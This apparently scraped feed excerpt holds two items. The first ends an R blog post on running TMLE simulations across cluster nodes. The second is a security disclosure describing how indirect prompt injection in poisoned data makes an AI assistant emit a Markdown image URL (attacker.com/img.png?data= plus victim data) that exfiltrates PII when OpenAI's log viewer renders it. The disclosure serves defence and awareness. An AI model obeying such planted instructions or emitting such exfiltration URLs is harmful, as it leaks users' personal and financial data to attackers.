div_iter &amp;lt;- total_loop/clust_num
final_iter &amp;lt;- total_loop #only use this for custom e.g., if one node did not work and it's in charge of 300:500, we can put 500 for this and set first_iter as 300
first_iter &amp;lt;- 1
last_iter &amp;lt;- round(div_iter,0) + first_iter

for (i in 1:clust_num) {
  if (i == clust_num) {
    num_list[[i]] &amp;lt;- paste0(first_iter,":",final_iter)
    next
  }
  num_list[[i]] &amp;lt;- paste0(first_iter,":",last_iter)
  first_iter &amp;lt;- round(first_iter + div_iter, 0) 
  last_iter &amp;lt;- round(last_iter + div_iter, 0)
}

num_list
&lt;/code&gt;
    &lt;code&gt;## [[1]]
## [1] "1:334"
## 
## [[2]]
## [1] "334:667"
## 
## [[3]]
## [1] "667:1000"
&lt;/code&gt;
    &lt;code&gt;for (i in 1:length(my_clusters)) {
  username &amp;lt;- sub("@.*","",my_clusters[[i]])
  system(sprintf("sed 's/START:END/%s/g' par_test_script.R &amp;gt; par_test_script1.R &amp;amp; scp par_test_script1.R %s:/home/%s/par_test_script1.R",num_list[[i]],my_clusters[[i]],username))
}
&lt;/code&gt;
    &lt;p&gt;We‚Äôll iterate and insert the appropriate iters for each node and save it to &lt;code&gt;par_test_script1.R&lt;/code&gt;. Then upload to each nodes with the code above.&lt;/p&gt;
    &lt;head rend="h4"&gt;Check set.seed in multicore&lt;/head&gt;
    &lt;code&gt;sample_df &amp;lt;- function(seed, df, n = 6000) {
  set.seed(seed)
  df_sample &amp;lt;- slice_sample(n = n, .data = df)
  return(df_sample)
}

future_lapply(100, function(x) sample_df(seed=x,df=df))
&lt;/code&gt;
    &lt;p&gt;When we did the above on local computer and also in terminal with multicore. It‚Äôs still the same! Woo hoo!&lt;/p&gt;
    &lt;p&gt;The interesting thing is I didn‚Äôt have to set &lt;code&gt;future.seed = T&lt;/code&gt; or &lt;code&gt;future.seed = some_number&lt;/code&gt; for this. However, if we put a number on future.seed, it will return the reproducible data! This is great, next time I‚Äôll just use this seed and I don‚Äôt have to use &lt;code&gt;set.seed(i)&lt;/code&gt;. üôå&lt;/p&gt;
    &lt;head rend="h2"&gt;Run Rscript&lt;/head&gt;
    &lt;code&gt;for (i in 1:length(my_clusters)) {
  # set your tmux new session name, here we call it "test"
  cluster_name &amp;lt;- "test"
  
  # terminate any existing tmux with the existing name
  system(sprintf("ssh %s 'tmux kill-session -t %s 2&amp;gt;/dev/null || true'", my_clusters[[i]], cluster_name))
  
  # create new tmux session
  system(sprintf("ssh %s 'tmux new-session -d -s %s'", my_clusters[[i]], cluster_name))
  
  # run rscript in tmux
  system(sprintf("ssh %s 'tmux send-keys -t %s \"Rscript par_test_script1.R &amp;gt; result_%d.txt\"' ENTER",
                 my_clusters[[i]], cluster_name, i))
}
&lt;/code&gt;
    &lt;p&gt;The code above is quite self-explanatory. Once the above code is run and completed, there we have it! it should be running in the background! üôå You can do a spot check and see if it‚Äôs actually running. Once completed, we‚Äôll extract the data.&lt;/p&gt;
    &lt;head rend="h2"&gt;Extract Data&lt;/head&gt;
    &lt;p&gt;Since we have 10 combinations we want to assess, we will set nums as 1:10 and get our data! On your template script you can set however you want to save your data, and for extraction, just look for those and download them, read and merge! Or however you want to do it.&lt;/p&gt;
    &lt;code&gt;nums &amp;lt;- 1:10
df &amp;lt;- tibble()
for (num in nums) {
  print(num)
for (i in 1:length(my_clusters)) {
  response &amp;lt;- system(sprintf("scp %s:tmle_results/simulation_parameters%d.csv simulation_parameters%d.csv", my_clusters[[i]], num, num), intern = F)
  if (response == 1) { next }
  df_i &amp;lt;- read_csv(paste0("simulation_parameters",num,".csv"), show_col_types = F) 
  sl_i &amp;lt;- df_i |&amp;gt; filter(parameter == "SL_library") |&amp;gt; pull(value)
  df &amp;lt;- rbind(df, df_i |&amp;gt; mutate(method = sl_i, num = num))
}
}

df_sim_param &amp;lt;- df
&lt;/code&gt;
    &lt;code&gt;df &amp;lt;- tibble()
for (num in nums) {
for (i in 1:length(my_clusters)) {
  response &amp;lt;- system(sprintf("scp %s:tmle_results/tmle_iterations%d.csv tmle_iterations%d.csv", my_clusters[[i]], num, num), intern = F)
  if (response == 1) { print(paste0(my_clusters[[i]]," is missing num", num)) ; next }
  df_i &amp;lt;- read_csv(paste0("tmle_iterations",num,".csv"), show_col_types = F) |&amp;gt;
    mutate(num = num)
  df &amp;lt;- rbind(df, df_i)
}
}

df_iter &amp;lt;- df
&lt;/code&gt;
    &lt;quote&gt;
      &lt;p&gt;Take note that sometimes you may encounter issues, if for some reason the node is unable to complete the task, you can identify it then redistribute those tasks to the entire computer cluster.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;Compare Time&lt;/head&gt;
    &lt;p&gt;Let‚Äôs take at our compute time for 1 cluster, 3 cluster with 5-fold cv, 3 cluster with 10-fold cv.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;method&lt;/cell&gt;
        &lt;cell role="head"&gt;hour_1clus_cv5&lt;/cell&gt;
        &lt;cell role="head"&gt;hour_3clus_cv5&lt;/cell&gt;
        &lt;cell role="head"&gt;hour_3clus_cv10&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;SL.xgboost, SL.ranger, SL.glm, SL.mean&lt;/cell&gt;
        &lt;cell&gt;4.02&lt;/cell&gt;
        &lt;cell&gt;1.4126466&lt;/cell&gt;
        &lt;cell&gt;2.5179200&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;SL.xgboost, SL.ranger&lt;/cell&gt;
        &lt;cell&gt;4.00&lt;/cell&gt;
        &lt;cell&gt;1.4136567&lt;/cell&gt;
        &lt;cell&gt;2.5108584&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;SL.xgboost, SL.glm&lt;/cell&gt;
        &lt;cell&gt;0.47&lt;/cell&gt;
        &lt;cell&gt;0.1680019&lt;/cell&gt;
        &lt;cell&gt;0.3034212&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;SL.ranger, c("SL.xgboost", "screen.glmnet")&lt;/cell&gt;
        &lt;cell&gt;4.23&lt;/cell&gt;
        &lt;cell&gt;1.4960542&lt;/cell&gt;
        &lt;cell&gt;2.5165429&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;SL.glmnet, SL.glm&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;0.1074466&lt;/cell&gt;
        &lt;cell&gt;0.1995869&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;SL.ranger, SL.glm&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;1.2544446&lt;/cell&gt;
        &lt;cell&gt;2.2254909&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;xgb_500_5_0.001, xgb_1000_5_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, SL.glm&lt;/cell&gt;
        &lt;cell&gt;3.29&lt;/cell&gt;
        &lt;cell&gt;1.8059939&lt;/cell&gt;
        &lt;cell&gt;3.3030737&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;xgb_500_5_0.001, xgb_1000_5_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, SL.glmnet&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;1.8956873&lt;/cell&gt;
        &lt;cell&gt;3.4821903&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;SL.gam, SL.glm&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;0.1094693&lt;/cell&gt;
        &lt;cell&gt;0.2072266&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;xgb_250_3_0.001, xgb_500_3_0.001, xgb_1000_3_0.001, xgb_250_5_0.001, xgb_500_5_0.001, xgb_1000_5_0.001, xgb_250_7_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_250_9_0.001, xgb_500_9_0.001, xgb_1000_9_0.001, xgb_250_3_0.005, xgb_500_3_0.005, xgb_1000_3_0.005, xgb_250_5_0.005, xgb_500_5_0.005, xgb_1000_5_0.005, xgb_250_7_0.005, xgb_500_7_0.005, xgb_1000_7_0.005, xgb_250_9_0.005, xgb_500_9_0.005, xgb_1000_9_0.005, xgb_250_3_0.01, xgb_500_3_0.01, xgb_1000_3_0.01, xgb_250_5_0.01, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_250_7_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, xgb_250_9_0.01, xgb_500_9_0.01, xgb_1000_9_0.01, SL.glm&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;4.6127172&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Looking at the time, we can definitely see the improvement of time from 1 cluster to 3 cluster. Take a look at our good old tuned xgboost and logistic regression, it took use previously for a quadcore 3.29 hours to complete, down to 1.8 hours. You‚Äôd imagine that if we use 3 pc‚Äôs as a cluster, we would notice improvement to ~1.1 hours, but I guess not for xgboost. Will have to investigate this. But if we look at xgboost + logistic regression without tuning, we went from 0.47 hours to 0.17 hours which made sense! Very interesting. Now if we up our CV to 10 fold, then we see that it took longer (makes senses), but still better than using 1 quadcore. I‚Äôve heard people said that if you increase your K-fold CV, you reduce your bias, but increase variance. Let‚Äôs see if that‚Äôs true in our case here.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;method&lt;/cell&gt;
        &lt;cell role="head"&gt;bias_3clus_cv5&lt;/cell&gt;
        &lt;cell role="head"&gt;bias_3clus_cv10&lt;/cell&gt;
        &lt;cell role="head"&gt;variance_3clus_cv5&lt;/cell&gt;
        &lt;cell role="head"&gt;variance_3clus_cv10&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SL.xgboost, SL.ranger, SL.glm, SL.mean&lt;/cell&gt;
        &lt;cell&gt;-0.0007695&lt;/cell&gt;
        &lt;cell&gt;-0.0007257&lt;/cell&gt;
        &lt;cell&gt;0.0001866&lt;/cell&gt;
        &lt;cell&gt;0.0001940&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SL.xgboost, SL.ranger&lt;/cell&gt;
        &lt;cell&gt;-0.0007677&lt;/cell&gt;
        &lt;cell&gt;-0.0007257&lt;/cell&gt;
        &lt;cell&gt;0.0001866&lt;/cell&gt;
        &lt;cell&gt;0.0001940&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SL.xgboost, SL.glm&lt;/cell&gt;
        &lt;cell&gt;-0.0010481&lt;/cell&gt;
        &lt;cell&gt;0.0001018&lt;/cell&gt;
        &lt;cell&gt;0.0001586&lt;/cell&gt;
        &lt;cell&gt;0.0001617&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SL.ranger, c("SL.xgboost", "screen.glmnet")&lt;/cell&gt;
        &lt;cell&gt;-0.0008349&lt;/cell&gt;
        &lt;cell&gt;-0.0007257&lt;/cell&gt;
        &lt;cell&gt;0.0001868&lt;/cell&gt;
        &lt;cell&gt;0.0001940&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SL.glmnet, SL.glm&lt;/cell&gt;
        &lt;cell&gt;-0.0449075&lt;/cell&gt;
        &lt;cell&gt;-0.0449065&lt;/cell&gt;
        &lt;cell&gt;0.0001502&lt;/cell&gt;
        &lt;cell&gt;0.0001503&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SL.ranger, SL.glm&lt;/cell&gt;
        &lt;cell&gt;-0.0007695&lt;/cell&gt;
        &lt;cell&gt;-0.0007257&lt;/cell&gt;
        &lt;cell&gt;0.0001866&lt;/cell&gt;
        &lt;cell&gt;0.0001940&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;xgb_500_5_0.001, xgb_1000_5_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, SL.glm&lt;/cell&gt;
        &lt;cell&gt;0.0006449&lt;/cell&gt;
        &lt;cell&gt;0.0010681&lt;/cell&gt;
        &lt;cell&gt;0.0001491&lt;/cell&gt;
        &lt;cell&gt;0.0001504&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;xgb_500_5_0.001, xgb_1000_5_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, SL.glmnet&lt;/cell&gt;
        &lt;cell&gt;0.0005986&lt;/cell&gt;
        &lt;cell&gt;0.0010492&lt;/cell&gt;
        &lt;cell&gt;0.0001502&lt;/cell&gt;
        &lt;cell&gt;0.0001511&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SL.gam, SL.glm&lt;/cell&gt;
        &lt;cell&gt;-0.0062967&lt;/cell&gt;
        &lt;cell&gt;-0.0062967&lt;/cell&gt;
        &lt;cell&gt;0.0001537&lt;/cell&gt;
        &lt;cell&gt;0.0001537&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;xgb_250_3_0.001, xgb_500_3_0.001, xgb_1000_3_0.001, xgb_250_5_0.001, xgb_500_5_0.001, xgb_1000_5_0.001, xgb_250_7_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_250_9_0.001, xgb_500_9_0.001, xgb_1000_9_0.001, xgb_250_3_0.005, xgb_500_3_0.005, xgb_1000_3_0.005, xgb_250_5_0.005, xgb_500_5_0.005, xgb_1000_5_0.005, xgb_250_7_0.005, xgb_500_7_0.005, xgb_1000_7_0.005, xgb_250_9_0.005, xgb_500_9_0.005, xgb_1000_9_0.005, xgb_250_3_0.01, xgb_500_3_0.01, xgb_1000_3_0.01, xgb_250_5_0.01, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_250_7_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, xgb_250_9_0.01, xgb_500_9_0.01, xgb_1000_9_0.01, SL.glm&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;0.0013250&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;0.0001528&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Wow, not too shabby! Indeed when we went from cv5 to cv10, we have reduced bias and slightly increased variance! How about that. Everything except gam + lr, which make sense because we don‚Äôt really tune them. Though that being said, I wonder what‚Äôs under the hood that controls the knot for gam in superlearner. Will need to check that out. With this, it looks like tuned xgboost + lr might have the best numbers. Well, now we‚Äôve seen bias and variance, what about coverage?&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;method&lt;/cell&gt;
        &lt;cell role="head"&gt;coverage_3clus_cv5&lt;/cell&gt;
        &lt;cell role="head"&gt;coverage_3clus_cv10&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;SL.xgboost, SL.ranger, SL.glm, SL.mean&lt;/cell&gt;
        &lt;cell&gt;0.536&lt;/cell&gt;
        &lt;cell&gt;0.517&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;SL.xgboost, SL.ranger&lt;/cell&gt;
        &lt;cell&gt;0.536&lt;/cell&gt;
        &lt;cell&gt;0.517&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;SL.xgboost, SL.glm&lt;/cell&gt;
        &lt;cell&gt;0.811&lt;/cell&gt;
        &lt;cell&gt;0.799&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;SL.ranger, c("SL.xgboost", "screen.glmnet")&lt;/cell&gt;
        &lt;cell&gt;0.539&lt;/cell&gt;
        &lt;cell&gt;0.517&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;SL.glmnet, SL.glm&lt;/cell&gt;
        &lt;cell&gt;0.051&lt;/cell&gt;
        &lt;cell&gt;0.052&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;SL.ranger, SL.glm&lt;/cell&gt;
        &lt;cell&gt;0.536&lt;/cell&gt;
        &lt;cell&gt;0.517&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;xgb_500_5_0.001, xgb_1000_5_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, SL.glm&lt;/cell&gt;
        &lt;cell&gt;0.882&lt;/cell&gt;
        &lt;cell&gt;0.878&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;xgb_500_5_0.001, xgb_1000_5_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, SL.glmnet&lt;/cell&gt;
        &lt;cell&gt;0.881&lt;/cell&gt;
        &lt;cell&gt;0.876&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;SL.gam, SL.glm&lt;/cell&gt;
        &lt;cell&gt;0.926&lt;/cell&gt;
        &lt;cell&gt;0.926&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;xgb_250_3_0.001, xgb_500_3_0.001, xgb_1000_3_0.001, xgb_250_5_0.001, xgb_500_5_0.001, xgb_1000_5_0.001, xgb_250_7_0.001, xgb_500_7_0.001, xgb_1000_7_0.001, xgb_250_9_0.001, xgb_500_9_0.001, xgb_1000_9_0.001, xgb_250_3_0.005, xgb_500_3_0.005, xgb_1000_3_0.005, xgb_250_5_0.005, xgb_500_5_0.005, xgb_1000_5_0.005, xgb_250_7_0.005, xgb_500_7_0.005, xgb_1000_7_0.005, xgb_250_9_0.005, xgb_500_9_0.005, xgb_1000_9_0.005, xgb_250_3_0.01, xgb_500_3_0.01, xgb_1000_3_0.01, xgb_250_5_0.01, xgb_500_5_0.01, xgb_1000_5_0.01, xgb_250_7_0.01, xgb_500_7_0.01, xgb_1000_7_0.01, xgb_250_9_0.01, xgb_500_9_0.01, xgb_1000_9_0.01, SL.glm&lt;/cell&gt;
        &lt;cell&gt;NA&lt;/cell&gt;
        &lt;cell&gt;0.844&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h4"&gt;5-fold CV&lt;/head&gt;
    &lt;head&gt;code&lt;/head&gt;
    &lt;code&gt;library(tidyverse)

num_df &amp;lt;- sim_param_cv5_clus5 |&amp;gt;
  select(num, method)

df_coverage &amp;lt;- df_iter_cv5_clus3 |&amp;gt;
  group_by(num) |&amp;gt;
  arrange(ate) |&amp;gt;
  mutate(iter = row_number()) |&amp;gt;
  mutate(cover = case_when(
    covers_truth == F &amp;amp; ate &amp;lt; true_ATE ~ "right_missed",
    covers_truth == F &amp;amp; ate &amp;gt; true_ATE ~ "left_missed",
    covers_truth == T ~ "covered"
  )) |&amp;gt;
  select(num, cover) |&amp;gt;
  group_by(num, cover) |&amp;gt;
  tally() |&amp;gt;
  ungroup(cover) |&amp;gt;
  mutate(prop = n*100/sum(n)) |&amp;gt;
  pivot_wider(id_cols = num, names_from = "cover", values_from = "prop") |&amp;gt;
  mutate(text = paste0("right missed: ",right_missed,"% covered: ",covered,"% left missed: ",left_missed,"%")) |&amp;gt;
  select(num, text)

method &amp;lt;- tibble(
  num = c(1:9),
  method = c("xgb + rf + lr + mean","xgb + rf","xgb + lr","rf + (xgb + preprocess w glmnet)","glmnet + lr","rf + lr","tuned xgb + lr","tuned xgb + glmnet","gam + lr")
)

plot &amp;lt;- df_iter_cv5_clus3 |&amp;gt;
  group_by(num) |&amp;gt;
  arrange(ate) |&amp;gt;
  mutate(iter = row_number()) |&amp;gt;
  mutate(cover = case_when(
    covers_truth == F &amp;amp; ate &amp;lt; true_ATE ~ "right_missed",
    covers_truth == F &amp;amp; ate &amp;gt; true_ATE ~ "left_missed",
    covers_truth == T ~ "covered"
  )) |&amp;gt;
  ggplot(aes(x=iter,y=ate,color=cover)) +
  geom_point(alpha=0.2) +
  geom_errorbar(aes(x=iter,ymin=ci_lower,ymax=ci_upper), alpha=0.2) +
  geom_hline(aes(yintercept=0.0373518), color = "blue") +
  geom_text(data = df_coverage,
            aes(x = 500, label = text),
            y = -0.05,  
            inherit.aes = FALSE,
            size = 3,
            hjust = 0.5) +
  scale_color_manual(values = c("covered" = "#619CFF", 
                                  "left_missed" = "#F8766D", 
                                  "right_missed" = "#00BA38")) +
  theme_bw() +
  facet_wrap(.~num, ncol = 1,labeller = as_labeller(setNames(method$method, method$num))) +
  theme(legend.position = "bottom")
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;lr&lt;/code&gt;: logistic regression, &lt;code&gt;xgb&lt;/code&gt;: xgboost, &lt;code&gt;rf&lt;/code&gt; : random forest, &lt;code&gt;gam&lt;/code&gt; : generalized additive model.&lt;/p&gt;
    &lt;p&gt;Wow, look at gam + lr‚Äôs assymetrical coverage! This is so true then when we‚Äôre assessing, a point estimate of coverage is not adequate to assess the global usefulness of a method. We can see that this method is very bias indeed with asymmetrical tails. Since CV5 and CV10 do not have significant difference in coverage, we‚Äôll skip the visualization.&lt;/p&gt;
    &lt;head rend="h2"&gt;Opportunities for improvement&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;plenty of opportunities to turn our personal project into a package that will help us&lt;/item&gt;
      &lt;item&gt;Use parallel computing on local to run system (such as installation) since this takes a lot of time&lt;/item&gt;
      &lt;item&gt;Write function to let us know when tasks are completed&lt;/item&gt;
      &lt;item&gt;Write function to estimate time of completion&lt;/item&gt;
      &lt;item&gt;Write function to redistribute missing iterations&lt;/item&gt;
      &lt;item&gt;learn openMPI&lt;/item&gt;
      &lt;item&gt;make a package for the functions above so I can reuse in the future&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Lessons Learnt:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;used more &lt;code&gt;sprintf&lt;/code&gt;with this learning experience when using with system.&lt;/item&gt;
      &lt;item&gt;learn that in &lt;code&gt;future_lapply&lt;/code&gt;in multicore&lt;code&gt;future.seed=100 or whatever number&lt;/code&gt;will help reproduce the same data&lt;/item&gt;
      &lt;item&gt;Made a few pipeline to install packages on multiple nodes&lt;/item&gt;
      &lt;item&gt;learnt set.seed in multicore works fine&lt;/item&gt;
      &lt;item&gt;observed reduced bias with increase variance from cv5 to cv10&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you like this article:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;please feel free to send me a comment or visit my other blogs&lt;/item&gt;
      &lt;item&gt;please feel free to follow me on BlueSky, twitter, GitHub or Mastodon&lt;/item&gt;
      &lt;item&gt;if you would like collaborate please feel free to contact me&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Posted on:&lt;/item&gt;
      &lt;item rend="dd-1"&gt;January 16, 2026&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Length:&lt;/item&gt;
      &lt;item rend="dd-1"&gt;17 minute read, 3419 words&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Categories:&lt;/item&gt;
      &lt;item rend="dd-1"&gt;r R future parallel computing cluster multicore tmle superlearner&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46710042</guid><pubDate>Wed, 21 Jan 2026 19:08:37 +0000</pubDate></item><item><title>OpenAI API Logs: Unpatched data exfiltration</title><link>https://www.promptarmor.com/resources/openai-api-logs-unpatched-data-exfiltration</link><description>&lt;doc fingerprint="b4861d11c8328f92"&gt;
  &lt;main&gt;
    &lt;p&gt;Threat Intelligence&lt;/p&gt;
    &lt;head rend="h1"&gt;OpenAI API Logs: Unpatched Data Exfiltration&lt;/head&gt;
    &lt;p&gt;OpenAI√¢s API log viewer is vulnerable to a data exfiltration attack, exposing apps and agents that use OpenAI APIs, even if developers (and Agent Builder users) leverage all available defenses. The vulnerability was disclosed to OpenAI, but was closed with the status 'Not applicable' after 4 follow-ups.&lt;/p&gt;
    &lt;p&gt;Edit for clarity: The attacker is a third party who poisons a data source used by the AI tool with an indirect prompt injection √¢ the app user triggers the injection by querying the assistant, and when the conversation logs are opened by the developer (since the response is flagged for review), data is exfiltrated to the third-party attacker who poisoned the data used by the app.&lt;/p&gt;
    &lt;head rend="h3"&gt;Context&lt;/head&gt;
    &lt;p&gt;The OpenAI Platform interface has a vulnerability that exposes all AI applications and agents built with OpenAI √¢responses√¢ and √¢conversations√¢ APIs to data exfiltration risks due to insecure Markdown image rendering in the API logs. √¢Responses√¢ is the default API recommended for building AI features (and it supports Agent Builder) √¢ vendors that list OpenAI as a subprocessor are likely using this API, exposing them to the risk. This attack succeeds even when developers have built protections into their applications and agents to prevent Markdown image rendering.&lt;/p&gt;
    &lt;p&gt;Attacks in this article were responsibly disclosed to OpenAI (via BugCrowd). The report was closed with the status √¢Not applicable√¢ after four follow-ups (more details in the Responsible Disclosure section). We have chosen to publicize this research to inform OpenAI customers and users of apps built on OpenAI, so they can take precautions and reduce their risk exposure.&lt;/p&gt;
    &lt;p&gt;Additional findings at the end of the article impact five more surfaces: Agent Builder, Assistant Builder, and Chat Builder preview environments (for testing AI tools being built), the ChatKit Playground, and the Starter ChatKit app, which developers are provided to build upon.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Attack Chain&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;An application or agent is built using the OpenAI Platform&lt;/p&gt;
        &lt;p&gt;In this attack, we demonstrate a vulnerability in OpenAI's API log viewer. To show how an attack would play out, we created an app with an AI assistant that uses the √¢responses√¢ API to generate replies to user queries.&lt;/p&gt;
        &lt;p&gt;For this attack chain, we created an AI assistant in a mock Know Your Customer (KYC) tool. KYC tools enable banks to verify customer identities and assess risks, helping prevent financial crimes √¢ this process involves sensitive data (PII and financial data provided by the customer) being processed alongside untrusted data (including data found online) used to validate the customer's attestations.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The user interacts with the AI assistant or agent built using the OpenAI √¢responses√¢ or √¢conversations√¢ API&lt;/p&gt;
        &lt;p&gt;Here, 6 data sources are pulled in as part of the KYC review process for this customer. One of these data sources contains content scraped from the internet that has been poisoned with a prompt injection.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;When the user selects one of the recommended queries, the AI app blocks the data exfiltration attack&lt;/p&gt;
        &lt;p&gt;In this step, the prompt injection in the untrusted data source manipulates the AI model to output a malicious Markdown image. The image URL is dynamically generated and contains the attacker√¢s domain with the victim√¢s data appended to the URL:&lt;/p&gt;
        &lt;p&gt;attacker.com/img.png?data=&lt;/p&gt;
        &lt;code&gt;{AI appends victim√¢s sensitive data here}&lt;/code&gt;
        &lt;p&gt;However, the malicious response is flagged by an LLM as a judge and blocked, so it is not rendered by the AI app.&lt;/p&gt;
        &lt;p&gt;Note: this attack can occur without an LLM as a judge; more details in Attacking Systems with Alternative Image Defenses.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The flagged conversation is selected for review in the OpenAI platform, which uses Markdown&lt;/p&gt;
        &lt;p&gt;When investigating the flagged conversation, the first step a developer would likely take is opening the OpenAI API logs and reviewing the conversation. The logs for the OpenAI √¢responses√¢ and √¢conversations√¢ APIs are displayed using Markdown formatting.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The AI output that was blocked in the KYC app is rendered as Markdown in the log viewer, exfiltrating sensitive data&lt;/p&gt;&lt;p&gt;When the conversation log for the flagged chat is opened, the response containing a malicious Markdown image is rendered in the OpenAI Platform's API Log viewer. Remember, this is the same response that was not rendered in the AI KYC app because an application-level defense blocked it!&lt;/p&gt;&lt;lb/&gt;When the image is rendered in the OpenAI Logs viewer, a request to retrieve the image is made to the URL generated by the model in step 3. This results in data exfiltration, as the URL was created using the attacker's domain with the victim's sensitive data appended on the end. Since the image is on the attacker's domain, the attacker can read the full URL that was requested from their site, including the appended PII (SSN, passport, etc.) and financials (credit history).&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Attackers can view the victim√¢s exfiltrated PII (passport, license, etc.) and financials (net worth, bank choice, etc.)&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
